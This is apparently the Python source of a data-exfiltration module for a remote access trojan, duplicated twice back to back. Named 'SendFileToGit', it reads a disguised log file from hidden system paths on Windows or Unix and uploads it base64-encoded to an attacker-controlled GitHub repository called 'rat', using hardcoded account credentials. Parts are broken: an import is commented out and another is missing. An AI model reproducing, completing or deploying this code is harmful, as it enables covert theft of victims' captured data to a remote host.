#from github3 import login
import base64
import os

path = "others/"
filePath = "Tapalog.log"#base64.b64encode("Tapalog.log")

def getOSPath():
  if os.name == 'posix':
    return str(os.getenv("HOME"))+".unix/syslog.log"
  elif os.name == 'nt':
    return "C:\\Users\\Public\\Libraries\\syslog.log"  #str(os.getenv("APPDATA"))+"\\Microsoft\\Crypto\\syslog.log"
  else :
    return str("OS not recognized!")

def run(**args):
	print("[*] In SendFileToGit module.") #Todelete
	try:
		TargetOSfilePath = getOSPath()
		fich = open(TargetOSfilePath, "r")
		content = fich.read()
		fich.close()
		#store_module_result(content)
		return str(content)
	except:
		return "SendFileToGit: File %s not found"% TargetOSfilePath



def connect_to_github():
	gh = login(username="TimeToPay",password="mdfigsdf5455")
	repo = gh.repository("TimeToPay","rat")
	branch = repo.branch("master")
	return gh,repo,branch

def store_module_result(data):
	gh,repo,branch = connect_to_github()
	remote_path= path+"sendFileToGit/%d:%d.%s"%(time.localtime().tm_hour,  time.localtime().tm_min, filePath)
	repo.create_file(remote_path,"Upload file %s"%filePath, base64.b64encode(data))
	return
run#from github3 import login
import base64
import os

path = "others/"
filePath = "Tapalog.log"#base64.b64encode("Tapalog.log")

def getOSPath():
  if os.name == 'posix':
    return str(os.getenv("HOME"))+".unix/syslog.log"
  elif os.name == 'nt':
    return "C:\\Users\\Public\\Libraries\\syslog.log"  #str(os.getenv("APPDATA"))+"\\Microsoft\\Crypto\\syslog.log"
  else :
    return str("OS not recognized!")

def run(**args):
	print("[*] In SendFileToGit module.") #Todelete
	try:
		TargetOSfilePath = getOSPath()
		fich = open(TargetOSfilePath, "r")
		content = fich.read()
		fich.close()
		#store_module_result(content)
		return str(content)
	except:
		return "SendFileToGit: File %s not found"% TargetOSfilePath



def connect_to_github():
	gh = login(username="TimeToPay",password="mdfigsdf5455")
	repo = gh.repository("TimeToPay","rat")
	branch = repo.branch("master")
	return gh,repo,branch

def store_module_result(data):
	gh,repo,branch = connect_to_github()
	remote_path= path+"sendFileToGit/%d:%d.%s"%(time.localtime().tm_hour,  time.localtime().tm_min, filePath)
	repo.create_file(remote_path,"Upload file %s"%filePath, base64.b64encode(data))
	return
